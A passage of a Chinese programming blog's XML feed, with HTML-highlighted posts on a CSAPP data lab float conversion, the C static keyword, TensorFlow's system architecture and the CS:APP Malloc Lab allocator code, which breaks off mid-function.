class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exp</span> = <span class="number">1</span><span class="number">-127</span>; <span class="comment">//1-bias</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  <span class="comment">//规格化</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">exp</span> = (<span class="built_in">exp</span>&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;<span class="comment">// exp-bias;</span></span><br><span class="line">    frac = <span class="number">1</span>+frac; <span class="comment">// frac+=1;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果小于0.5, 那么应该等于0</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sign * (frac &lt;&lt; <span class="built_in">exp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CSAPP Lab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[static用法]]></title>
      <url>/wiki/2017/12/30/C-static%E7%94%A8%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>static在C语言中是非常重要的关键字，但是它很容易被理解错误。因为static可以出现在多个地方，有着不同的含义：</p>
<ul>
<li>static 全局变量</li>
<li>static 局部变量</li>
<li>static 函数</li>
</ul>
<p>根本原因是[1]:<br><img src="http://or9a8nskt.bkt.clouddn.com/Screen Shot 2018-07-09 at 1.37.29 PM.png" alt="static"></p>
<p>当一个全局变量被声明为static(静态全局变量)时，它的存储位置并没有改变，还在虚拟内存的.data段（已初始化数据）。但是它只在定义它的源文件内有效，其他源文件无法访问它。它最重要的改变是<strong>链接属性</strong>的改变：静态变量的初始化在链接时已完成，如果显示指定初始值，则初始化为0。</p>
<p>每次函数调用静态局部变量的时候都修改它然后离开，下次读的时候从全局存储区读出的静态局部变量就是上次修改后的值。</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ol>
<li>Pointers on C, page 61</li>
</ol>
]]></content>
      
        <categories>
            
            <category> C </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C </tag>
            
            <tag> static </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[1 TF系统框架]]></title>
      <url>/wiki/2017/12/30/TensorFlow-1-TF%E7%B3%BB%E7%BB%9F%E6%A1%86%E6%9E%B6/</url>
      <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25646408">转自</a></p>
<p>2015年11月9日，Google发布深度学习框架TensorFlow并宣布开源，并迅速得到广泛关注，在图形分类、音频处理、推荐系统和自然语言处理等场景下都被大面积推广。TensorFlow系统更新快速，官方文档教程齐全，上手快速且简单易用，支持Python和C++接口。本文依据对Tensorflow（简称TF）白皮书[1]、TF Github[2]和TF官方教程[3]的理解，从系统和代码实现角度讲解TF的内部实现原理。以Tensorflow r0.8.0为基础，本文由浅入深的阐述Tensor和Flow的概念。先介绍了TensorFlow的核心概念和基本概述，然后剖析了OpKernels模块、Graph模块、Session模块。</p>
<h1 id="1-TF系统框架"><a href="#1-TF系统框架" class="headerlink" title="1.  TF系统框架"></a>1.  TF系统框架</h1><h2 id="1-1-TF依赖视图"><a href="#1-1-TF依赖视图" class="headerlink" title="1.1 TF依赖视图"></a>1.1 TF依赖视图</h2><p>TF的依赖视图如图1所示，描述了TF的上下游关系链。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148850325344.jpg" alt="图 1 TensorFlow依赖视图"></p>
<p>TF托管在github平台，有google groups和contributors共同维护。</p>
<p>TF提供了丰富的深度学习相关的API，支持Python和C/C++接口。</p>
<p>TF提供了可视化分析工具Tensorboard，方便分析和调整模型。</p>
<p>TF支持Linux平台，Windows平台，Mac平台，甚至手机移动设备等各种平台。</p>
<h2 id="1-2-TF系统架构"><a href="#1-2-TF系统架构" class="headerlink" title="1.2 TF系统架构"></a>1.2 TF系统架构</h2><p>图1-2是TF的系统架构，从底向上分为设备管理和通信层、数据操作层、图计算层、API接口层、应用层。其中设备管理和通信层、数据操作层、图计算层是TF的核心层。<br><img src="http://or9a8nskt.bkt.clouddn.com/15148851086975.jpg" alt="图1-2 TF系统架构"></p>
<p>底层设备通信层负责网络通信和设备管理。设备管理可以实现TF设备异构的特性，支持CPU、GPU、Mobile等不同设备。网络通信依赖gRPC通信协议实现不同设备间的数据传输和更新。</p>
<p>第二层是Tensor的OpKernels实现。这些OpKernels以Tensor为处理对象，依赖网络通信和设备内存分配，实现了各种Tensor操作或计算。Opkernels不仅包含MatMul等计算操作，还包含Queue等非计算操作，这些将在第5章Kernels模块详细介绍。</p>
<p>第三层是图计算层（Graph），包含本地计算流图和分布式计算流图的实现。Graph模块包含Graph的创建、编译、优化和执行等部分，Graph中每个节点都是OpKernels类型表示。关于图计算将在第6章Graph模块详细介绍。</p>
<p>第四层是API接口层。Tensor C API是对TF功能模块的接口封装，便于其他语言平台调用。</p>
<p>第四层以上是应用层。不同编程语言在应用层通过API接口层调用TF核心功能实现相关实验和应用。</p>
<h2 id="1-3-TF代码目录组织"><a href="#1-3-TF代码目录组织" class="headerlink" title="1.3 TF代码目录组织"></a>1.3 TF代码目录组织</h2><p>图1-3是TF的代码结构视图，下面将简单介绍TF的目录组织结构。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148898749709.png" alt="图1-3 TF代码目录组织结构"></p>
<p><code>Tensorflow/core</code>目录包含了TF核心模块代码。</p>
<p><code>public</code>: API接口头文件目录，用于外部接口调用的API定义，主要是<code>session.h</code> 和<code>tensor_c_api.h</code>。</p>
<p><code>client</code>: API接口实现文件目录。</p>
<p><code>platform</code>: OS系统相关接口文件，如file system, env等。</p>
<p><code>protobuf</code>: 均为.proto文件，用于数据传输时的结构序列化.</p>
<p><code>common_runtime</code>: 公共运行库，包含<code>session</code>, <code>executor</code>, <code>threadpool</code>, <code>rendezvous</code>, memory管理, 设备分配算法等。</p>
<p><code>distributed_runtime</code>: 分布式执行模块，如rpc session, rpc master, rpc worker, graph manager。</p>
<p><code>framework</code>: 包含基础功能模块，如log, memory, tensor</p>
<p><code>graph</code>: 计算流图相关操作，如construct, partition, optimize, execute等</p>
<p><code>kernels</code>: 核心Op，如matmul, conv2d, argmax, batch_norm等</p>
<p><code>lib</code>: 公共基础库，如gif、gtl(google模板库)、hash、histogram等。</p>
<p><code>ops</code>: 基本ops运算，ops梯度运算，io相关的ops，控制流和数据流操作</p>
<p><code>Tensorflow/stream_executor</code>目录是并行计算框架，由google stream executor团队开发。</p>
<p><code>Tensorflow/contrib</code>目录是contributor开发目录。</p>
<p><code>Tensroflow/python</code>目录是python API客户端脚本。</p>
<p><code>Tensorflow/tensorboard</code>目录是可视化分析工具，不仅可以模型可视化，还可以监控模型参数变化。</p>
<p><code>third_party</code>目录是TF第三方依赖库。</p>
<p><code>eigen3</code>: eigen矩阵运算库，TF基础ops调用</p>
<p><code>gpus</code>: 封装了cuda/cudnn编程库</p>
<h2 id="1-4-TF-–-Kernels模块"><a href="#1-4-TF-–-Kernels模块" class="headerlink" title="1.4 TF – Kernels模块"></a>1.4 TF – Kernels模块</h2><p>TF中包含大量Op算子，这些算子组成Graph的节点集合。这些算子对Tensor实现相应的运算操作。图1-4列出了TF中的Op算子的分类和举例。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148898870393.png" alt="图 1-4 TensorFlow核心库中的部分运算
"></p>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Lab6 Malloc Lab]]></title>
      <url>/wiki/2017/12/30/CSAPP-Lab-Malloc-lab/</url>
      <content type="html"><![CDATA[<p>Malloc Lab的目的是设计一个通用分配器。它基于隐式空闲链表，使用立即边界标记合并方式。</p>
<p>分配器包含在一个源文件<code>mm.c</code>中，这次Lab需要完成四个函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">/* 初始化分配器 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;  <span class="comment">/* malloc */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span>; <span class="comment">/* free */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">/* realloc */</span></span><br></pre></td></tr></table></figure>
<p>堆的示意图如下所示。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/heap_model.png" alt="heap_model"></p>
<p>最后发现这个lab的答案书上竟然已经写出来了，写的特别好，借鉴一下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Simple, 32-bit and 64-bit clean allocator based on implicit free</span></span><br><span class="line"><span class="comment"> * lists, first-fit placement, and boundary tag coalescing, as described</span></span><br><span class="line"><span class="comment"> * in the CS:APP3e text. Blocks must be aligned to doubleword (8 byte)</span></span><br><span class="line"><span class="comment"> * boundaries. Minimum block size is 16 bytes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If NEXT_FIT defined use next fit search, else use first-fit search</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_FITx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mallocmacros */</span></span><br><span class="line"><span class="comment">/* Basic constants and macros */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> <span class="comment">//line:vm:mm:beginconst</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span>  <span class="comment">//line:vm:mm:endconst</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) <span class="comment">//line:vm:mm:pack</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))            <span class="comment">//line:vm:mm:get</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))    <span class="comment">//line:vm:mm:put</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)                   <span class="comment">//line:vm:mm:getsize</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)                    <span class="comment">//line:vm:mm:getalloc</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)                      <span class="comment">//line:vm:mm:hdrp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) <span class="comment">//line:vm:mm:ftrp</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE))) <span class="comment">//line:vm:mm:nextblkp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) <span class="comment">//line:vm:mm:prevblkp</span></span></span><br><span class="line"><span class="comment">/* $end mallocmacros */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *heap_listp = <span class="number">0</span>;  <span class="comment">/* Pointer to first block */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *rover;           <span class="comment">/* Next fit rover */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes for internal helper routines */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - Initialize the memory manager</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mminit */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Create the initial empty heap */</span></span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="comment">//line:vm:mm:begininit</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);                          <span class="comment">/* Alignment padding */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">1</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue header */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue footer */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span>*WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));     <span class="comment">/* Epilogue header */</span></span><br><span class="line">    heap_listp += (<span class="number">2</span>*WSIZE);                     <span class="comment">//line:vm:mm:endinit</span></span><br><span class="line">    <span class="comment">/* $end mminit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    rover = heap_listp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* $begin mminit */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Extend the empty heap with a free block of CHUNKSIZE bytes */</span></span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mminit */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block with at least size bytes of payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmmalloc */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">/* Adjusted block size */</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">/* Amount to extend heap if no fit */</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $end mmmalloc */</span></span><br><span class="line">    <span class="keyword">if</span> (heap_listp == <span class="number">0</span>)&#123;</span><br><span class="line">        mm_init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin mmmalloc */</span></span><br><span class="line">    <span class="comment">/* Ignore spurious requests */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust block size to include overhead and alignment reqs. */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)                                          <span class="comment">//line:vm:mm:sizeadjust1</span></span><br><span class="line">        asize = <span class="number">2</span>*DSIZE;                                        <span class="comment">//line:vm:mm:sizeadjust2</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE<span class="number">-1</span>)) / DSIZE); <span class="comment">//line:vm:mm:sizeadjust3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search the free list for a fit */</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;  <span class="comment">//line:vm:mm:findfitcall</span></span><br><span class="line">        place(bp, asize);                  <span class="comment">//line:vm:mm:findfitplace</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No fit found. Get more memory and place the block */</span></span><br><span class="line">    extendsize = MAX(asize,CHUNKSIZE);                 <span class="comment">//line:vm:mm:growheap1</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;                                  <span class="comment">//line:vm:mm:growheap2</span></span><br><span class="line">    place(bp, asize);                                 <span class="comment">//line:vm:mm:growheap3</span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmmalloc */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Free a block</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfree */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line">    <span 